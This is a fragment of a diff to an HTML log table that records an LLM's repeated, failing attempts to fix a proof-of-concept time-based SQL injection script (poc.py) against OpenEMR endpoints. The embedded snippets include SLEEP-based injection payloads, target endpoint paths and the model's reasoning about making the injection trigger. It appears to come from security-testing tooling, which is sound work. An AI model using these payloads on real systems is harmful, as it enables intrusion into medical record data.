 +                print(f&quot;[+] SQLi CONFIRMED via taskman.php! Response delayed by {elapsed:.2f}s&quot;)
 +</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:20:34</td><td>M3 PoC Fix</td><td class="center">18</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:20:34</td><td>M3 PoC Fix</td><td class="center">18</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -68,6 +68,9 @@ def test_sqli(session, target, site, delay=3):
@@ -2323,7 +2324,7 @@ Looking at this PoC, the issue is that the SQL injection isn&#x27;t being trigge
 -    # Try the primary vulnerable endpoint with proper AJAX POST request first
 -    primary_url = urljoin(target, &quot;/interface/forms/eye_mag/php/Anything_simple.php&quot;)
 +    # Measure baseline re</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:21:34</td><td>M3 PoC Fix</td><td class="center">19</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:21:34</td><td>M3 PoC Fix</td><td class="center">19</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 Looking at this issue, the PoC fails because the eye_mag module endpoints don&#x27;t exist in the test environment. I need to add alternative endpoints that exist in base OpenEMR and also use `getProviderIdOfEncounter()`. I&#x27;ll also try different injection points through form handlers.
 
 --- a/poc.py
@@ -2369,7 +2370,7 @@ Looking at this issue, the PoC fails because the eye_mag module endpoints don&#x
 +        f&quot;0&#x27; OR SLEEP({delay})-- -&quot;,
 +        f&quot;(SELECT SLEEP({delay}))-- -&quot;,
 +        f&quot;1-SLEEP({delay}</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:22:13</td><td>M3 PoC Fix</td><td class="center">20</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:22:13</td><td>M3 PoC Fix</td><td class="center">20</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -62,6 +62,8 @@ def test_sqli(session, target, site, delay=3):
@@ -2417,7 +2418,7 @@ Looking at this issue, the PoC fails because the eye_mag module endpoints don&#x
 +                print(f&quot;[+] SQLi CONFIRMED! Response delayed by {elapsed:.2f}s&quot;)
 +                print(f&quot;[+] Payload: {payload}&quot;)
 +                print(f&quot;[+] Endpoint: /interface/patient_file/encounter/encounter_top.php&quot;</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:24:02</td><td>M3 PoC Fix</td><td class="center">21</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:24:02</td><td>M3 PoC Fix</td><td class="center">21</td><td class="center mono">6fd082aa</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 Looking at the error output, the PoC authenticates successfully but all endpoint checks are returning 404, causing them to be skipped. The &quot;check endpoint exists&quot; logic is too aggressive. I&#x27;ll remove the 404 skip and try endpoints regardless, since some vulnerable endpoints may return errors but still be injectable.
 
 --- a/poc.py
@@ -2463,7 +2464,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 -            continue
          url = urljoin(target, endpoint)
          for payload in error_payloads:</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:24:41</td><td>M3 PoC Fix</td><td class="center">22</td><td class="center mono">138b1a63</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:24:41</td><td>M3 PoC Fix</td><td class="center">22</td><td class="center mono">138b1a63</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -60,7 +60,10 @@ def test_sqli(session, target, site, delay=3):
@@ -2517,7 +2518,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 -    primary_url = urljoin(target, &quot;/interface/forms/eye_mag/php/Anything_simple.php&quot;)
 -
 -    #</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:25:43</td><td>M3 PoC Fix</td><td class="center">23</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:25:43</td><td>M3 PoC Fix</td><td class="center">23</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -76,14 +76,18 @@ def test_sqli(session, target, site, delay=3):
@@ -2564,7 +2565,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 +    for action in [&quot;retrieve&quot;, &quot;get_PRIOR&quot;, &quot;PRIORS_query&quot;, &quot;get_allMissing&quot;, &quot;get_PMSFH&quot;, &quot;save&quot;]:
          for payload in payloads:
              post</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:26:17</td><td>M3 PoC Fix</td><td class="center">24</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:26:17</td><td>M3 PoC Fix</td><td class="center">24</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -63,6 +63,8 @@ def test_sqli(session, target, site, delay=3):
@@ -2606,7 +2607,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 +                print(f&quot;[+] SQLi CONFIRMED! Response delayed by {elapsed:.2f}s&quot;)
 +                print(f&quot;[+] Payload: {payload}&quot;)
 +                prin</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:27:25</td><td>M3 PoC Fix</td><td class="center">25</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:27:25</td><td>M3 PoC Fix</td><td class="center">25</td><td class="center mono">2dbd34ca</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -63,6 +63,37 @@ def authenticate(session, target, user, password, site):
@@ -2662,7 +2663,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 @@ -91,6 +124,8 @@ def test_sqli(session, target, site, delay=3):
      actions = [
          &quot;retrieve&quot;,</td><td><span class="muted">—</span></td></tr>
-<tr style="background:rgba(127,29,29,0.35);"><td class="nowrap">2026-10-15 19:28:42</td><td>M3 PoC Fix</td><td class="center">26</td><td class="center mono">e2ab04c8</td><td class="center"><span class="badge badge-fail">FAIL</span></td><td class="comment-cell"><span class="lbl-err">ERROR FOUND</span><br>[LLM reasoning]
+<tr style="background:#fff5f5;"><td class="nowrap">2026-10-15 19:28:42</td><td>M3 PoC Fix</td><td class="center">26</td><td class="center mono">e2ab04c8</td><td class="center"><span class="badge badge-fail">Fail</span></td><td class="comment-cell"><span class="lbl-err">Error found</span><br>[LLM reasoning]
 --- a/poc.py
 +++ b/poc.py
 @@ -232,8 +232,6 @@ def test_sqli(session, target, site, delay=3):
@@ -2704,7 +2705,7 @@ Looking at the error output, the PoC authenticates successfully but all endpoint
 +
  
  def main():
-     parser = argparse.ArgumentParser(<hr class="sep"><span class="lbl-fix">CHANGES MADE</span><br>--- a/poc.py
+     parser = argparse.ArgumentParser(<hr class="sep"><span class="lbl-fix">Changes made</span><br>--- a/poc.py
 +++ b/poc.py
 @@ -232,8 +232,6 @@ def test_sqli(session, target, site, delay=3):
              except:
